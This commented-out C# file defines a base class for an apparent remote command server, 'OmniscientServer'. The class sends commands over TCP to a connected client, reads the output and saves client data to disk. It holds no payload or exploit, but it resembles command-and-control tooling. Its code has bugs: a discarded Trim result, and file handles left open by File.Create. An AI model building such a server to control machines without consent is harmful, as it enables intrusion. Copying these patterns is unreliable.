// using System.Net.Sockets;
// using System.Text;

// namespace OmniscientServer
// {
//     public abstract class ExecuteOnClientCommandBase : Command
//     {
//         public ExecuteOnClientCommandBase(Server server) : base(server) { }

//         protected override string ExecuteCommand(string[] parameters)
//         {
//             if (parameters.Length == 1)
//             {
//                 return $"Omniscient$ Please specify a command to execute on the client.";
//             }

//             ProcessParameters(parameters);

//             string commandToSend = CreateCommand(parameters);
//             Console.WriteLine(commandToSend);

//             TcpClient client = server.clients[server.clientId];

//             // Send the command to the client
//             using (StreamWriter writer = new StreamWriter(client.GetStream(), Encoding.ASCII, 1024, true))
//             {
//                 writer.WriteLine(commandToSend);
//             }

//             string result;
//             byte[] buffer = new byte[client.ReceiveBufferSize];
//             StringBuilder completeMessage = new StringBuilder();

//             // Get the result from the client
//             NetworkStream stream = client.GetStream();
//             int count;

//             do
//             {
//                 count = stream.Read(buffer, 0, buffer.Length);
//                 completeMessage.Append(Encoding.ASCII.GetString(buffer, 0, count));
//             }
//             while (stream.DataAvailable);

//             result = completeMessage.ToString();

//             return GetResult(result, parameters);
//         }

//         protected void ProcessParameters(string[] parameters)
//         {
//             foreach (var parameter in parameters)
//             {
//                 parameter.Trim();
//             }
//         }
//         protected abstract string CreateCommand(string[] parameters);
//         protected abstract string GetResult(string result, string[] parameters);

//         public void Writer(string content, string filename, bool writeLine = false)
//         {

//             if (!Directory.Exists(server.clientDataPath))
//             {
//                 Directory.CreateDirectory(server.clientDataPath);
//             }

//             string path = $@"{server.clientDataPath}\{filename}";

//             if (!File.Exists(path))
//             {
//                 File.Create(path);
//             }
//             else
//             {
//                 File.Delete(path);
//                 File.Create(path);
//             }

//             using (FileStream fs = new FileStream(path, FileMode.Append, FileAccess.Write))
//             using (StreamWriter outputFile = new StreamWriter(path, append: true))
//             {
//                 if (writeLine) {
//                     outputFile.WriteLine($"{content}");
//                 } 
//                 else 
//                 {
//                     outputFile.Write(content);
//                 }
//             }
//         }

//         protected override bool RequiresClientConnection()
//         {
//             return true;
//         }
//     }
// }
